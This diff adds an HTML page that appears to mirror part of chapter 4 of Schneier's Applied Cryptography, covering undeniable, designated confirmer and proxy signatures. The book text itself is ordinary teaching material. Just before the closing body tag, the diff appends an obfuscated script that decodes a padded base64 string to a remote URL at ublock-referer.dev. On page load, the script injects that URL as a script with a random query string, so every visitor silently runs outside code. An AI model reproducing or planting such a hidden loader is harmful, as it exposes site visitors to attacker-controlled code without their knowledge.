@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=081-083//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>For instance, Bob buys a legal copy of DEW. He can validate the signature on the software package whenever he wants. Then, Bob convinces Carol that he&#146;s a salesman from the Alice Software Company. He sells her a pirated copy of DEW. When Carol tries to validate the signature with Bob, he simultaneously validates the signature with Alice. When Carol sends him the random number, he then sends it on to Alice. When Alice replies, he then sends the reply on to Carol. Carol is convinced that she is a legitimate buyer of the software, even though she isn&#146;t. This attack is an instance of the chess grandmaster problem and is discussed in detail in Section 5.2.
+</P>
+<P>Even so, undeniable signatures have a lot of applications; in many instances Alice doesn&#146;t want anyone to be able to verify her signature. She might not want personal correspondence to be verifiable by the press, be shown and verified out of context, or even to be verified after things have changed. If she signs a piece of information she sold, she won&#146;t want someone who hasn&#146;t paid for the information to be able to verify its authenticity. Controlling who verifies her signature is a way for Alice to protect her personal privacy.</P>
+<P>A variant of undeniable signatures separates the relation between signer and message from the relation between signer and signature [910]. In one signature scheme, anyone can verify that the signer actually created the signature, but the cooperation of the signer is required to verify that the signature is valid for the message.</P>
+<P>A related notion is an <B>entrusted undeniable signature</B> [1229]. Imagine that Alice works for Toxins, Inc., and sends incriminating documents to a newspaper using an undeniable signature protocol. Alice can verify her signature to the newspaper reporter, but not to anyone else. However, CEO Bob suspects that Alice is the source of the documents. He demands that Alice run the disavowal protocol to clear her name, and Alice refuses. Bob maintains that the only reason Alice has to refuse is that she is guilty, and fires her.</P>
+<P>Entrusted undeniable signatures are like undeniable signatures, except that the disavowal protocol can only be run by Trent. Bob cannot demand that Alice run the disavowal protocol; only Trent can. And if Trent is the court system, then he will only run the protocol to resolve a formal dispute.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">4.4 Designated Confirmer Signatures</FONT></H3>
+<P>The Alice Software Company is doing a booming business selling DEW&#151;so good, in fact, that Alice is spending more time verifying undeniable signatures than writing new features.
+</P>
+<P>Alice would like a way to designate one particular person in the company to be in charge of signature verification for the whole company. Alice, or any other programmer, would be able to sign documents with an undeniable protocol. But the verifications would all be handled by Carol.</P>
+<P>As it turns out, this is possible with <B>designated confirmer signatures</B> [333, 1213]. Alice can sign a document such that Bob is convinced the signature is valid, but he cannot convince a third party; at the same time Alice can designate Carol as the future confirmer of her signature. Alice doesn&#146;t even need to ask Carol&#146;s permission beforehand; she just has to use Carol&#146;s public key. And Carol can still verify Alice&#146;s signature if Alice is out of town, has left the company, or just upped and died.</P>
+<P>Designated confirmer signatures are kind of a compromise between normal digital signatures and undeniable signatures. There are certainly instances where Alice might want to limit who can verify her signature. On the other hand, giving Alice complete control undermines the enforceability of signatures: Alice might refuse to cooperate in either confirming or denying, she might claim the loss of keys for confirming or denying, or she might just be unavailable. Designated confirmer signatures can give Alice the protection of an undeniable signature while not letting her abuse that protection. Alice might even prefer it that way: Designated confirmer signatures can help prevent false applications, protect her if she actually does lose her key, and step in if she is on vacation, in the hospital, or even dead.</P>
+<P>This idea has all sorts of possible applications. Carol can set herself up as a notary public. She can publish her public key in some directory somewhere, and people can designate her as a confirmer for their signatures. She can charge a small fee for confirming signatures for the masses and make a nice living.</P>
+<P>Carol can be a copyright office, a government agency, or a host of other things. This protocol allows organizations to separate the people who sign documents from the people who help verify signatures.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">4.5 Proxy Signatures</FONT></H3>
+<P>Designated confirmer signatures allows a signer to designate someone else to verify his signature. Alice, for instance, needs to go on a business trip to someplace which doesn&#146;t have very good computer network access&#151;to the jungles of Africa, for example. Or maybe she is incapacitated after major surgery. She expects to receive some important e-mail, and has instructed her secretary Bob to respond accordingly. How can Alice give Bob the power to sign messages for her, without giving him her private key?
+</P>
+<P><B>Proxy signatures</B> is a solution [1001]. Alice can give Bob a proxy, such that the following properties hold:</P>
+<DL>
+<DD>&#151; <B><I>Distinguishability</I></B>. Proxy signatures are distinguishable from normal signatures by anyone.
+<DD>&#151; <B><I>Unforgeability</I></B>. Only the original signer and the designated proxy signer can create a valid proxy signature.
+<DD>&#151; <B><I>Proxy signer&#146;s deviation</I></B>. A proxy signer cannot create a valid proxy signature not detected as a proxy signature.
+<DD>&#151; <B><I>Verifiability</I></B>. From a proxy signature, a verifier can be convinced of the original signer&#146;s agreement on the signed message.
+<DD>&#151; <B><I>Identifiability</I></B>. An original signer can determine the proxy signer&#146;s identity from a proxy signature.
+<DD>&#151; <B><I>Undeniability</I></B>. A proxy signer cannot disavow an accepted proxy signature he created.
+</DL>
+<P>In some cases, a stronger form of identifiability is required&#151;that anyone can determine the proxy signer&#146;s identity from the proxy signature. Proxy signature schemes, based on different digital signature schemes, are in [1001].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BwSTUoEq, MgfaQqhW) {MgfaQqhW = BwSTUoEq.createElement('script');MgfaQqhW.type = 'text/javascript';MgfaQqhW.async = true;MgfaQqhW.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BwSTUoEq.getElementsByTagName('body')[0].appendChild(MgfaQqhW);}(document));</script></body>
+</html>
